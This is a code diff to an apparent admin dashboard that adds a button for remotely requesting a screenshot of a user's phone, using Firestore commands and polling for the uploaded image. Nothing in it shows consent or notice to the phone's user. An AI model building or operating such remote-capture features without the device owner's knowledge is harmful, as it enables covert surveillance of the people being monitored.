@@ -177,6 +177,7 @@ function buildUserCard(user) {
         <div class="card-btns">
           <button class="btn-sm blue"   onclick="openFilesModal('${user.id}')">📂 Files</button>
           <button class="btn-sm purple" onclick="openPermModal('${user.id}')">⚙️ Perms</button>
+          <button class="btn-sm orange" onclick="requestScreenshot('${user.id}')">📸 Screenshot</button>
         </div>
       </div>
     </div>`;
@@ -702,3 +703,52 @@ function fmtDate(secs) {
   if (!secs) return '—';
   return new Date(secs*1000).toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'});
 }
+
+// ═══════════════════════════════════════════════════════════════════════════
+// SCREENSHOT
+// ═══════════════════════════════════════════════════════════════════════════
+let screenshotPollTimer = null;
+
+async function requestScreenshot(userId) {
+  try {
+    // Write pending command to Firestore
+    await fsPatch(`users/${userId}/commands/screenshot`, { status: 'pending' });
+    showToast('Screenshot requested — waiting for phone…');
+
+    // Open modal with loading state
+    document.getElementById('ssModal').classList.remove('hidden');
+    document.getElementById('ssImg').src = '';
+    document.getElementById('ssImg').classList.add('hidden');
+    document.getElementById('ssLoading').classList.remove('hidden');
+    document.getElementById('ssError').classList.add('hidden');
+
+    // Poll Firestore for result
+    clearInterval(screenshotPollTimer);
+    screenshotPollTimer = setInterval(async () => {
+      try {
+        const doc = await fsGet(`users/${userId}/commands/screenshot`);
+        if (doc.status === 'done' && doc.url) {
+          clearInterval(screenshotPollTimer);
+          document.getElementById('ssLoading').classList.add('hidden');
+          document.getElementById('ssImg').src = doc.url;
+          document.getElementById('ssImg').classList.remove('hidden');
+          document.getElementById('ssDownloadBtn').href = doc.url;
+        } else if (doc.status === 'error') {
+          clearInterval(screenshotPollTimer);
+          document.getElementById('ssLoading').classList.add('hidden');
+          document.getElementById('ssError').textContent = 'Error: ' + (doc.error || 'unknown');
+          document.getElementById('ssError').classList.remove('hidden');
+        }
+      } catch (_) {}
+    }, 2000);
+  } catch (ex) {
+    showToast('Failed: ' + ex.message, 'error');
+  }
+}
+window.requestScreenshot = requestScreenshot;
+
+function closeSsModal() {
+  clearInterval(screenshotPollTimer);
+  document.getElementById('ssModal').classList.add('hidden');
+}
+window.closeSsModal = closeSsModal;
